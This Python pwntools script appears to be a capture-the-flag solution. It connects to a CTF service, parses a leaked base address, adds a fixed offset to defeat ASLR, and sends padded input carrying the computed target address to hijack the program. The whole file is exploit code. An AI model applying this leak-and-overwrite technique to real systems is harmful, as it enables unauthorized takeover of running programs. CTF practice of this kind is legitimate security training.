from pwn import *
from sys import stdout

def main():

    remoteProcess = remote("ctf.compsecu.com", 10101)

    # Get base address
    baseAddress = remoteProcess.recvline()
    baseAddress = str(baseAddress).split(" ")[5][2:-3]
    stdout.write(f'BASE ADDRESS:_> {hex(int(baseAddress, 16))}\n')

    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare first input
    sendLine = b"AAAAAAAAAA"
    # Send first input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')

    # Prepare target address
    ASLRDiff = 0x128
    targetAddress = hex(int(baseAddress, 16) + ASLRDiff)

    # Prepare second input
    sendLine = b"BBBBBBBBBB" + bytearray(targetAddress, "utf-8")
    # Send second input
    stdout.write(f'{sendLine}\n')
    remoteProcess.sendline(sendLine)

    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')
    stdout.write(f'{remoteProcess.recvline()}\n')

if __name__ == "__main__":
    main()
